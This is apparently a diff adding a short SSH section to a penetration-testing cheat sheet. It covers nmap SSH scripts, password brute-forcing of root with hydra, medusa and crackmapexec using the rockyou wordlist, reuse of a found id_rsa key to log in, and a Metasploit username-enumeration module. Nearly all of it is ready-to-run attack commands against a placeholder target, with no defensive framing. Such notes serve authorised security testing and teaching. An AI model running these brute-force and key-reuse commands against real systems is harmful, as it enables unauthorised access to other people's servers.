@@ -1,0 +1,20 @@
+SSH
+Nmap Scripts
+bashnmap --script ssh-auth-methods,ssh-hostkey,ssh-run,ssh2-enum-algos -p 22 target
+nmap --script ssh-brute -p 22 target
+Tools
+bash# Audit algorithms (find weak ones)
+ssh-audit target
+
+# Brute
+hydra -l root -P rockyou.txt ssh://target
+medusa -h target -u root -P rockyou.txt -M ssh
+crackmapexec ssh target -u users.txt -p pass.txt
+
+# Old key reuse exploit
+# If you find an id_rsa anywhere (web, SMB, FTP)
+chmod 600 id_rsa
+ssh -i id_rsa user@target
+
+# Username enum (older OpenSSH)
+msf > use auxiliary/scanner/ssh/ssh_enumusers
